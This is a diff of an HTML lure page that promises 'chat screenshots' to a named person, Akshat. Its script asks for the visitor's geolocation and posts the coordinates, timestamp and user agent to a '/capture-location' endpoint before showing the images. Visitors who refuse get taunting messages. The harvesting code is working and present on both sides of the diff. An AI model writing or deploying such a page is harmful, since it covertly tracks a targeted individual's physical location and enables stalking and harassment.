@@ -7,11 +7,10 @@
     <style>
         body {
             margin: 0;
-            padding: 0;
             background: #000;
             color: #fff;
             font-family: Arial, sans-serif;
-            overflow: hidden;
+            text-align: center;
         }
         .content, .denied {
             display: none;
@@ -19,26 +18,16 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            text-align: center;
             padding: 20px;
-        }
-        img {
-            max-width: 85%;
-            margin: 25px 0;
-            border: 2px solid #555;
-            border-radius: 12px;
-        }
-        h2 {
-            color: #ff5555;
-            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Screenshots shown only if location allowed -->
+    <!-- Main Content -->
     <div class="content" id="content">
         <h1>Akshat Chat Screenshots</h1>
+        <p>Loading screenshots...</p>
         <img src="/static/0jAV3.png" alt="">
         <img src="/static/dX66Z.png" alt="">
         <img src="/static/JQyOg.png" alt="">
@@ -46,47 +35,43 @@
         <img src="/static/CiyTj.png" alt="">
     </div>
 
-    <!-- Denied Message -->
+    <!-- Denied -->
     <div class="denied" id="denied">
         <h2>Akshat we know its you</h2>
         <h2>We have blocked your location</h2>
         <h2>We ain't showing you what's in this website</h2>
-        <img src="/static/satvik.jpg" alt="Akshat">
-        <p style="margin-top: 40px; font-size: 20px;">😂</p>
+        <img src="/static/satvik.jpg" alt="">
     </div>
 
     <script>
-        function requestLocation() {
-            if (!navigator.geolocation) {
-                showDenied();
-                return;
-            }
-
+        window.onload = function() {
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
+                function(position) {
+                    // Send location
                     fetch('/capture-location', {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
                         body: JSON.stringify({
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
                             timestamp: new Date().toISOString(),
                             userAgent: navigator.userAgent
                         })
+                    })
+                    .then(() => {
+                        document.getElementById('content').style.display = 'flex';
+                    })
+                    .catch(() => {
+                        document.getElementById('content').style.display = 'flex'; // show anyway
                     });
-                    document.getElementById('content').style.display = 'flex';
                 },
-                () => {
-                    showDenied();
+                function() {
+                    document.getElementById('denied').style.display = 'flex';
                 }
             );
-        }
-
-        function showDenied() {
-            document.getElementById('denied').style.display = 'flex';
-        }
-
-        window.onload = requestLocation;
+        };
     </script>
 </body>
 </html>
